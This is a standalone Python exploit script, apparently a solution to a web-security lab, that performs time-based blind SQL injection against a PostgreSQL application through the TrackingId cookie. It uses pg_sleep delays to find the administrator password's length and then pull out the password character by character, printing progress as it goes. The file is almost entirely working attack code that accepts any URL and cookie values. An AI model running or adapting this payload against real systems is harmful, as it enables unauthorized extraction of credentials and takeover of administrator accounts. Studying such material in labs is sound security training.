#!/usr/bin/env python3
# Blind SQL injection with time delays and information retrieval (PostgreSQL)
import requests
import string
import time
import sys

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_length(url, cookie, session):
    for i in range(1,100):
        # '||(SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
        sqli = f"'||(SELECT CASE WHEN LENGTH(password)={i} THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"
        c = {'TrackingId':f'{cookie}{sqli}', 'session':f'{session}'}
        s_time = time.time()
        requests.get(url, cookies=c, verify=False, proxies=p)
        e_time = time.time() - s_time
        if e_time > 5:
            return i
        i = i+1
    return False

def get_password(url, cookie, session, passwd_length):
    admin_passwd = list()
    for i in range(1,passwd_length+1):
        for char in string.printable:
            # '||(SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
            sqli = f"'||(SELECT CASE WHEN SUBSTRING(password,{i},1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"
            c = {'TrackingId':f'{cookie}{sqli}', 'session':f'{session}'}
            s_time = time.time()
            requests.get(url, cookies=c, verify=False, proxies=p)
            e_time = time.time() - s_time
            if e_time > 5:
                admin_passwd.append(char)
                break
            x = ''.join(admin_passwd) + char
            sys.stdout.write('\r' + x)
            sys.stdout.flush()

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        cookie = sys.argv[2].strip()
        session = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: {} <url> <cookie_value> <session_value>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com abcdef123 abcdef123".format(sys.argv[0]))
        sys.exit(1)

    print("[-] Finding the password length...")
    passwd_length = get_length(url, cookie, session)
    if passwd_length:
        print("[-] Found the password length... [{}]".format(passwd_length))
        print("[-] Retrieving administrator password...")
        print("[!] Tip... at the end string must replace with next character...")
        get_password(url, cookie, session, passwd_length)
    else:
        print("[-] Can't find the password length!")